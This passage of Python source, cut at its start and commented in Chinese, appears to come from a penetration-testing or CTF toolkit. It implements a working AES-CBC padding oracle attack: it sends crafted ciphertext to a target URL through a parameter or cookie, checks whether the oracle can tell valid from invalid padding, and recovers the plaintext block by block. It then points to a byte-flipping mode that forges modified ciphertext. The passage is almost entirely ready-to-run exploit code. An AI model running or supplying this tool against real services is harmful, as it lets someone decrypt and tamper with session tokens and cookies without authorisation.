        base_params = params.get("oracle_params") or ""

        async def oracle(prev: bytes, cur: bytes) -> bool:
            """探测 prev‖cur 解密后的填充是否有效。"""
            if interval:
                await asyncio.sleep(interval)
            enc = _encode_material(prev + cur, ve)
            ps = base_params.replace("{payload}", urllib.parse.quote(enc, safe=''))
            ck = dict(extra)
            if params.get("oracle_cookie"):
                ck[params["oracle_cookie"]] = enc
            st, b, _ = await req_retry("oracle 探测", url, params["oracle_method"], ps, ck)
            ok = (ok_status is None or st == ok_status) and (ok_re is None or bool(ok_re.search(b)))
            return (not ok) if invert else ok

        # Oracle 自检：原密文（填充必然有效）与随机前缀（几乎必然无效）判定应相反
        if ivb is not None and len(blocks) == 1:
            ref_valid = await oracle(bytes(ivb), blocks[0])
        elif len(blocks) >= 2:
            ref_valid = await oracle(blocks[-2], blocks[-1])
        else:
            ref_valid = None
        if ref_valid is not None:
            ref_random = await oracle(bytes(BLOCK), blocks[-1])
            if not ref_valid:
                report.append(
                    "[警告] Oracle 自检：原始密文被判为「填充无效」——目标密文、iv_b64 或判定配置可能有问题")
            if ref_valid == ref_random:
                report.append(
                    f"[警告] Oracle 自检：原密文与随机前缀判定相同（均为 {ref_valid}），"
                    "判定配置可能无法区分有效/无效填充；注意正则别匹配到失败响应"
                    "（如 VALID 会匹配 INVALID），或检查 oracle_invert")
            else:
                report.append(f"[自检] Oracle 判定可区分（原密文={ref_valid}，随机前缀={ref_random}）")

        # 逐块恢复（从最后一块向前）
        plaintext_blocks: list[bytes] = [b""] * len(blocks)
        for bi in range(len(blocks) - 1, -1, -1):
            if bi == 0 and ivb is None:
                report.append("[提示] 未提供 IV，跳过块 0（提供 iv_b64 或勾选 iv_in_cipher 可恢复首块）")
                continue
            prev = bytes(ivb) if bi == 0 else blocks[bi - 1]
            cur = blocks[bi]
            report.append(f"[进度] 恢复块 {bi}/{len(blocks) - 1}（最多 {BLOCK * 256} 次探测）")
            rec = bytearray(BLOCK)
            probe = bytearray(prev)
            for pad in range(1, BLOCK + 1):
                for k in range(1, pad):
                    probe[BLOCK - k] = prev[BLOCK - k] ^ rec[BLOCK - k] ^ pad
                found = -1
                for g in range(256):
                    probe[BLOCK - pad] = prev[BLOCK - pad] ^ g ^ pad
                    if await oracle(bytes(probe), cur):
                        if pad == 1:
                            # 排除误报：翻转倒数第二字节后必须仍判有效，才认为 pad=1 成立
                            probe[BLOCK - 2] ^= 1
                            still = await oracle(bytes(probe), cur)
                            probe[BLOCK - 2] ^= 1
                            if still:
                                found = g
                                break
                        else:
                            found = g
                            break
                if found < 0:
                    raise ValueError(
                        f"块 {bi} 的 padding={pad} 字节未找到（256 个候选全无效），"
                        "检查 oracle 判定配置（oracle_ok_regex / oracle_ok_status / oracle_invert）")
                rec[BLOCK - pad] = found
            plaintext_blocks[bi] = bytes(rec)
            report.append(f"[恢复] 块 {bi}: {bytes(rec)!r}")

        full = b"".join(plaintext_blocks)
        if ivb is None:
            report.append("[结果] 注：块 0 未恢复（缺 IV），以下明文从块 1 开始")
        report.append(f"[结果] 恢复明文（{len(full)}B，hex）: {full.hex()}")
        report.append(f"[结果] 恢复明文（raw）: {full!r}")
        if full:
            last = full[-1]
            if 1 <= last <= BLOCK and full[-last:] == bytes([last]) * last:
                stripped = full[:-last]
                report.append(f"[结果] 去除 PKCS7 填充（{last}B）: {stripped!r}")
                try:
                    report.append(f"[结果] 明文文本（utf-8）: {stripped.decode('utf-8')}")
                except UnicodeDecodeError:
                    pass
        report.append("[提示] 把恢复出的明文填入 plaintext 模板，即可用 flip/attack 模式做字节翻转")

    # ------------------------------------------------------------------

    async def run(self, params: dict, ctx: ToolContext) -> ToolResult:
        report: list[str] = [f"[模式] {params['mode']}（AES-CBC 字节翻转，块长 {BLOCK}）"]
        try:
            if params["mode"] == "flip":
                self._run_flip(params, report)
            elif params["mode"] == "attack":
                await self._run_attack(params, report)
            else:
                await self._run_oracle(params, report)
            return ToolResult(status=Status.SUCCESS, stdout="\n".join(report),
                              data={"mode": params["mode"]})
        except ValueError as e:
            report.append(f"[错误] {e}")
            return ToolResult(status=Status.ERROR, stdout="\n".join(report), stderr=str(e))
        except Exception as e:  # 网络等运行时错误
            report.append(f"[中止] {type(e).__name__}: {e}")
            return ToolResult(status=Status.ERROR, stdout="\n".join(report), stderr=str(e))
